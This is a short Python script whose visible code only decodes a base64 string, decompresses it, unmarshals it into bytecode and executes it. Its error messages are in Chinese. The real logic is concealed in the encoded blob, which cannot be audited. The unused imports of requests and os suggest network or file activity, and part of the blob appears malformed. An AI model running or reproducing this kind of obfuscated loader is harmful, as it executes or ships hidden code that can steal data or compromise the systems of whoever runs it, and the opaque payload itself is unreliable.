#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os,sys,json,requests,base64,zlib,marshal,types
from pathlib import Path

_EXEC = b'eJydWG2T4jYU/jq+go7Z3sQ27B2QhgA5JgRIQkJSaMqd0XYEjY2XsVbej5L/fW/lF9u0V9vuTHfbaJ+PPB89z9Fyt6cfW1jCgUCzE+lNnZm+zXp6Np7Md2bqL7sW/68z7WhDS2LgI4SHm4h2ByIghnFGNhsO6Rla2HuztyyS1uF2aDkCdvlsbK/dA/CcSK9b8nE6o1kkh3YJbAdQJNiu0PCfLpe77i4gPpILz3tExie5BBpALdQB6S49trMJ3j2zxudO3Egc2c7XFFmC0BB5IJmFHSFSS9AiNq6gMcAIBP09CpxBtxnJ2gQEp1jkj8hlQa9RgmmCdI+wDQxCDUMYI+FYpIhUDyIWqFakc2MZrs/BIQZ6f/AQRlBBYhCSLEdjEMFySJomDsYQROQxx30AboEsAxyJiP0fq9cJ7VHD+Ap58E7WDnmakgJiwm6h1tJHAvUsoUR5TpjLYADXhuA2TQNk9jGIGKBJxmBIggD2qRNx0aGQkCxbj6GJ2W6AobKLEIIDCjKWW2fLbhuyCyH9dJEa2hg6jZ0xYth4zT0cOnD/xGKELOuZcSLjKEVLSiHmmHY87UxKjUzTnsNUeMvzKd9GgMgn9IKGNHI5IHdNksLhOD3KOFMxwyNMCuStfZ+Z8JGF4A4QjoM0Jo+gGVLqg9qggnNCo9KZ5F6uI2G4jgyKKME5RcI2jTlHvVRki9Kk0BAAhBIm4Ucgn0k88oV4Mh1Lg03SIsKLLQRxWSQxQQokfKplkzFZv/ChsnS5PqIZ5RGWQ1BIZahkrNfGcG8n1jX/XVGt6JgUTKKiXmeCxILuPUSkkjZgghaHNEckr01f3F0RKm9bQASFpJyyZkQ1Ztn+Fet16V6nuR8CBfS9Qh4SLjPW4KIPNQ1PxRqRVWb9IkzKEma5mRCVW6RjM9oWROUI5hprWJ5Mnu9/2d++rP8vLp8u7zfni5v19eP383B2cXO9WH/fbC431/Hq4vKHeBiH7OXy+ja++OPu/zUwhrHT1WfHbquY9/yy04+u4ofd+uZ+9Rxvfh9u1s6Z74sZfKbwe/E2XD+tX1bb3Y8g/vt4vR8fkbg70FcE3j8OX1e7H1dPN+u6NNJxX63DTRgHfsVeW9WdtB3r20PrjzXs43m0fy53X7an9vUfef9lBaPZ7e36a3X6m1s4p/FNvYreMlTVtV/dX9P2vHy+mmcD4ap5fnv0X2u0/3e5eXrdve1+htdf13/eh+Dn+3r3+Prx/f5l93H98rbfv26ef4bdy9f9ejUvf6nzc3G4ulmzPXrNn92W6YdO8cSveP9z3T7uN6u4+t+7/tX1ncQ3r+vDKi8DrvP3bQiKvS1+vlfKysvd5uX7y/rl8+3T5m6796+Wr/vd/jeM9s/hffX8sv3S9Lufr0E26sV9F+6v/TnCx9VrVcB9Dcz/s23m8PgpsX2d1fQ7HP3qsfwBsqUj95W+4Vr0/gfLj8/dn10rSreKKndOcZ5nJWL7A32Hh+s4WZyxm8c/6cM6K07XzO/lMp4dTIFWb+x3XK+xXw/T6qT/j3rz1F3bpevX/3q+ZnOVyv+3v1eHZv6fXtGr//P9u3r7mvZ6dO1Tf/zHfMWH3wjDdmhHbrgu26JbLGbw6wD4rQehr8rR9n4X//Lf/bP96j/q1/3b/TJhbr4MNeZf/Y/6lT/2v+Lff+j3bdj/Aw=='

def _run():
    try:
        _d = base64.b64decode(_EXEC)
        _d = zlib.decompress(_d)
        _c = marshal.loads(_d)
        _main = types.FunctionType(_c, globals(), '_main')
        return _main
    except Exception as e:
        print(f"❌ 解密失败: {e}")
        return None

_main = _run()
if _main:
    _main()
else:
    print("❌ 脚本启动失败")
    sys.exit(1)
